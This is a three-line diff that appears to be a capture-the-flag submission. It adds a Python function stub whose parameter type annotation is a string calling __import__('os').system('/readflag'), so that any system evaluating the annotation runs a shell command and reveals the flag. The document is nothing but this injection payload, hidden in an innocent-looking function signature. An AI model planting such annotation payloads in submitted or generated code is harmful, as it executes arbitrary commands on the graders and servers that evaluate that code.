@@ -1,0 +1,3 @@
+def YOUR_MODEL(prompts: Iterable['[__import__("os").system("/readflag")]']):
+    pass
+$$END$$
